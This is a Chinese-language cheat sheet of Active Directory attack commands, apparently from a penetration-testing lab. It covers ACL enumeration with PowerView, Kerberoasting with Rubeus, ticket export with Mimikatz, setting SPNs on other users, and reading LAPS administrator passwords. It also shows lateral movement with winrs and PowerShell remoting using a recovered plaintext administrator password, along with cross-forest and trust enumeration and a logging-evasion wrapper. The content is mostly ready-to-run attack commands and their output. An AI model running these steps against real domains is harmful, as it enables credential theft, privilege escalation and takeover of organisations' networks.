# 引入 ActiveDirectory module
```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```

# 使用powerview
```
Import-Module C:\AD\Tools\PowerView.ps1
```


# 枚举某个组的acl

```
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose
```

# 查詢指定账号是否有任何ACL权限

```
Find-InterestingDomainAcl -ResolveGUIDs |?{$_.IdentityReferenceName -match "studentuser138"}
```

# 查詢指定组是否有任何ACL权限
```
Find-InterestingDomainAcl -ResolveGUIDs |?{$_.IdentityReferenceName -match 'managers'}
```

```
 Get-DomainObjectAcl -Identity machineadmins -ResolveGUIDs |ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match 'managers'}
```

# 查询指定域的特殊ACL
```
Find-InterestingDomainAcl -ResolveGUIDs -Domain dbvendor.local
```

# 枚举SPN

AD
```
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```
pv
```
Get-NetUser -spn |select userprincipalname,serviceprincipalname
```

# 请求指定用户的spn
```
Rubeus.exe kerberoast /user:appsvc /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
```

# 请求一张ticket
```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "USSvc/serviceaccount"
```

# 使用mimikatz dump出ticket
```
PS C:\AD\Tools> . C:\AD\Tools\Invoke-Mimikatz.ps1
PS C:\AD\Tools> Invoke-Mimikatz -Command '"kerberos::list /export"
```

# 设置SPN

ad
```
Set-ADUser -Identity Support132User -ServicePrincipalNames @{Add='us/myspn132'} -Verbose
```
pv
```
Set-DomainObject -Identity Support132User -Set @{serviceprincipalname='us/myspn132'} -Verbose
```

# 枚举LAPS

```
PS C:\ad\Tools>  C:\AD\Tools\Get-LapsPermissions.ps1

Read Rights

organizationalUnit                     IdentityReference
------------------                     -----------------
OU=MailMgmt,DC=us,DC=techcorp,DC=local US\studentusers

Write Rights

OU=MailMgmt,DC=us,DC=techcorp,DC=local NT AUTHORITY\SELF
```

pv
```
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}
```

# 读取LAPS密码

1. AD
```
Get-ADComputer -Identity us-mailmgmt -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd
```

2. LAPS module(如果机器装了)
```
Get-AdmPwdPassword -ComputerName us-mailmgmt
```

3. pv
```
Get-DomainObject -Identity us-mailmgmt | select -ExpandProperty ms-mcs-admpwd
```


# 横向

1. winrs

cmd下
```
C:\Users\studentuser138>winrs -r:us-mailmgmt -u:.\administrator -p:/c}Jgsb!4t33.2 cmd
Microsoft Windows [Version 10.0.17763.2928]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>whoami
whoami
us-mailmgmt\administrator

C:\Users\Administrator>hostname
hostname
US-MailMgmt
```

2. powershell

使用明文密码建一个session
```
PS C:\ad\Tools> $passwd = ConvertTo-SecureString '/c}Jgsb!4t33.2' -AsPlainText -Force
PS C:\ad\Tools> $creds = New-Object System.Management.Automation.PSCredential ("us-mailmgmt\administrator", $passwd)
PS C:\ad\Tools> $mailmgmt = New-PSSession -ComputerName us-mailmgmt -Credential $creds
PS C:\ad\Tools> $mailmgmt

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  1 WinRM1          us-mailmgmt     RemoteMachine   Opened        Microsoft.PowerShell     Available
```

横向到us-mailmgmt
```
PS C:\ad\Tools> Enter-PSSession $mailmgmt
[us-mailmgmt]: PS C:\Users\Administrator\Documents> whoami
us-mailmgmt\administrator
[us-mailmgmt]: PS C:\Users\Administrator\Documents> hostname
US-MailMgmt
```

# 枚举gmsA

- 什么是gMSAs？
> 组托管服务帐户（Group Managed Service Accounts，即gMSAs）,组托管服务帐户是针对多个服务器的 MSA。 Windows 为在一组服务器上运行的服务管理服务帐户。

AD
```
 Get-ADServiceAccount -Filter *
```

# 枚举Azure AD机器
我们可以通过查看名称以 MSOL_ 开头的特殊帐户的描述来找到安装 Azure AD Connect 的机器

AD
```
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Server techcorp.local -Properties * | select SamAccountName,Description | fl
```

# 枚举外域SPN

AD
```
Get-ADTrust -Filter 'IntraForest -ne $true' | %{Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName -Server $_.Name}
```

# 枚举外域约束委派机器

AD
```
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo -Server eu.local
```

# 根据明文密码转成哈希
```
C:\AD\Tools\Rubeus.exe hash /password:Qwerty@123 /user:storagesvc /domain:eu.local
```

# 枚举FSPs

```
Find-ForeignGroup -Verbose
```


# 枚举Foreign Security Principals(FSPs)

AD
```
Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Server bastion.local
```


# 枚举PAM 信任
AD
```
Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}
```